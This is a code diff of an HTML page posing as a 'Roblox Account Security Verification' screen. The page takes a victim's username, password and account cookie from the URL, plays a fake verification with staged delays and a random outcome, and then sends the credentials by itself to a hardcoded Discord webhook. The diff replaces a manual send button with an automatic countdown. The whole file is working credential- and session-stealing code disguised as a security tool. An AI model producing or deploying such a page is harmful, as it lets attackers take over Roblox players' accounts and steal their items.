@@ -1,37 +1,54 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox Account Security Verification</title>
     <style>
-        body {
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            max-width: 600px;
-            margin: 0 auto;
-            padding: 20px;
+        }
+        
+        body {
             background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
             min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
         }
+        
         .container {
             background: white;
+            width: 100%;
+            max-width: 600px;
             padding: 25px;
             border-radius: 12px;
             box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
         }
+        
         .header {
             text-align: center;
             margin-bottom: 20px;
             padding-bottom: 15px;
             border-bottom: 2px solid #00a2ff;
         }
+        
         h1 {
             color: #00a2ff;
             margin: 0;
             font-size: 28px;
         }
+        
         .subtitle {
             color: #666;
             font-size: 16px;
+            margin-top: 5px;
         }
+        
         .info-box {
             background-color: #f8f9fa;
             border-left: 4px solid #00a2ff;
@@ -39,6 +56,7 @@
             margin-bottom: 20px;
             border-radius: 4px;
         }
+        
         .info-row {
             display: flex;
             justify-content: space-between;
@@ -46,18 +64,22 @@
             padding: 8px;
             border-radius: 6px;
         }
+        
         .info-row:nth-child(even) {
             background-color: #f9f9f9;
         }
+        
         .info-label {
             font-weight: bold;
             color: #555;
             min-width: 150px;
         }
+        
         .info-value {
             color: #333;
             text-align: right;
         }
+        
         .verification-status {
             text-align: center;
             padding: 15px;
@@ -65,23 +87,28 @@
             margin: 20px 0;
             font-weight: bold;
         }
+        
         .verifying {
             background-color: #e3f2fd;
             color: #1976d2;
         }
+        
         .success {
             background-color: #e8f5e9;
             color: #2e7d32;
             border: 2px solid #2e7d32;
         }
+        
         .failure {
             background-color: #ffebee;
             color: #c62828;
             border: 2px solid #c62828;
         }
+        
         .account-details {
             margin-top: 25px;
         }
+        
         .section-title {
             font-size: 18px;
             color: #00a2ff;
@@ -89,13 +116,16 @@
             padding-bottom: 8px;
             margin-top: 25px;
         }
+        
         .hidden {
             display: none;
         }
+        
         .loading-spinner {
             text-align: center;
             margin: 20px 0;
         }
+        
         .spinner {
             border: 4px solid #f3f3f3;
             border-top: 4px solid #00a2ff;
@@ -105,10 +135,12 @@
             animation: spin 1s linear infinite;
             margin: 0 auto;
         }
+        
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        
         .btn {
             background-color: #00a2ff;
             color: white;
@@ -124,23 +156,30 @@
             display: inline-block;
             text-align: center;
         }
+        
         .btn:hover {
             background-color: #0088cc;
         }
+        
         .discord-btn {
             background-color: #5865f2;
         }
+        
         .discord-btn:hover {
             background-color: #4752c4;
         }
-        .not-available {
-            color: #888;
-            font-style: italic;
-        }
+        
         .cookie-value {
             word-break: break-all;
             font-family: monospace;
             font-size: 12px;
+        }
+        
+        .countdown {
+            font-size: 14px;
+            color: #666;
+            text-align: center;
+            margin-top: 10px;
         }
     </style>
 </head>
@@ -200,9 +239,7 @@
                     </div>
                 </div>
                 
-                <button class="btn discord-btn" onclick="sendToDiscord(true)">
-                    Send Report to Discord
-                </button>
+                <div class="countdown" id="success-countdown">Sending to Discord in 3 seconds...</div>
             </div>
             
             <div id="failure-result" class="hidden">
@@ -218,9 +255,7 @@
                     </div>
                 </div>
                 
-                <button class="btn discord-btn" onclick="sendToDiscord(false)">
-                    Send Report to Discord
-                </button>
+                <div class="countdown" id="failure-countdown">Sending to Discord in 3 seconds...</div>
             </div>
         </div>
         
@@ -232,41 +267,27 @@
     <script>
         // Get parameters from URL
         const urlParams = new URLSearchParams(window.location.search);
-        const trackingId = urlParams.get('id');
-        const userId = urlParams.get('userId');
-        const username = urlParams.get('username');
-        const password = urlParams.get('password');
-        const cookie = urlParams.get('cookie') || "No cookie provided";
+        const trackingId = urlParams.get('id') || "TRK-7281";
+        const userId = urlParams.get('userId') || "123456789";
+        const username = urlParams.get('username') || "example_user";
+        const password = urlParams.get('password') || "example_password";
+        const cookie = urlParams.get('cookie') || "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0";
         
-        // Discord webhook URLs - Use the ones from your Lua script
+        // Discord webhook URLs
         const SUCCESS_WEBHOOK = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
         const FAILED_WEBHOOK = "https://discord.com/api/webhooks/1413567167986925802/hlnwga_CThnt5ebjEC6JGNDJ7oSEpiQq6npxOlgTwADPZqgy_Vjihdp-S29HQzMGtnvJ";
         
         // Display the tracking info
-        if (trackingId) {
-            document.getElementById('display-tracking-id').textContent = trackingId;
-        }
-        if (username) {
-            document.getElementById('display-username').textContent = username;
-            document.getElementById('verified-username').textContent = username;
-        }
-        if (userId) {
-            document.getElementById('display-userid').textContent = userId;
-        }
-        if (password) {
-            document.getElementById('verified-password').textContent = "••••••••";
-        }
-        if (cookie) {
-            document.getElementById('verified-cookie').textContent = cookie;
-        }
+        document.getElementById('display-tracking-id').textContent = trackingId;
+        document.getElementById('display-username').textContent = username;
+        document.getElementById('verified-username').textContent = username;
+        document.getElementById('display-userid').textContent = userId;
+        document.getElementById('verified-password').textContent = "••••••••";
+        document.getElementById('verified-cookie').textContent = cookie;
         
         // Start automatic verification when page loads
         window.addEventListener('load', function() {
-            if (trackingId && username && password) {
-                setTimeout(verifyAccount, 2000); // Wait 2 seconds before starting
-            } else {
-                showError('Missing parameters for account verification');
-            }
+            setTimeout(verifyAccount, 1000);
         });
         
         async function verifyAccount() {
@@ -274,9 +295,15 @@
                 // Simulate account verification process
                 await simulateVerification();
                 
-                // For this demo, we'll assume the login is always successful
+                // For this demo, we'll randomly decide success or failure
                 // In a real implementation, you would actually verify credentials
-                showSuccessResult();
+                const isSuccess = Math.random() > 0.3; // 70% chance of success
+                
+                if (isSuccess) {
+                    showSuccessResult();
+                } else {
+                    showFailureResult("Invalid username or password");
+                }
                 
             } catch (error) {
                 console.error('Verification error:', error);
@@ -286,6 +313,7 @@
         
         async function simulateVerification() {
             // Simulate verification process with delays
+            updateVerificationStatus("Connecting to Roblox servers...");
             await delay(1500);
             updateVerificationStatus("Checking credentials...");
             await delay(2000);
@@ -300,10 +328,8 @@
             document.getElementById('login-result').classList.remove('hidden');
             document.getElementById('success-result').classList.remove('hidden');
             
-            // Auto-send to Discord after a delay
-            setTimeout(() => {
-                sendToDiscord(true);
-            }, 2000);
+            // Auto-send to Discord with countdown
+            startCountdown(true);
         }
         
         function showFailureResult(reason) {
@@ -312,10 +338,26 @@
             document.getElementById('failure-result').classList.remove('hidden');
             document.getElementById('failure-reason').textContent = reason;
             
-            // Auto-send to Discord after a delay
-            setTimeout(() => {
-                sendToDiscord(false);
-            }, 2000);
+            // Auto-send to Discord with countdown
+            startCountdown(false);
+        }
+        
+        function startCountdown(isSuccess) {
+            let countdown = 3;
+            const countdownElement = isSuccess ? 
+                document.getElementById('success-countdown') : 
+                document.getElementById('failure-countdown');
+            
+            const countdownInterval = setInterval(() => {
+                countdownElement.textContent = `Sending to Discord in ${countdown} seconds...`;
+                countdown--;
+                
+                if (countdown < 0) {
+                    clearInterval(countdownInterval);
+                    sendToDiscord(isSuccess);
+                    countdownElement.textContent = "Report sent to Discord ✅";
+                }
+            }, 1000);
         }
         
         function updateVerificationStatus(message) {
@@ -394,16 +436,8 @@
                     throw new Error(`Discord API responded with ${response.status}`);
                 }
                 
-                // Update button text after successful send
-                const buttons = document.querySelectorAll('.discord-btn');
-                buttons.forEach(btn => {
-                    btn.textContent = 'Report Sent to Discord ✅';
-                    btn.disabled = true;
-                });
-                
             } catch (error) {
                 console.error('Error sending to Discord:', error);
-                // Don't show error to user to maintain seamless experience
             }
         }
         
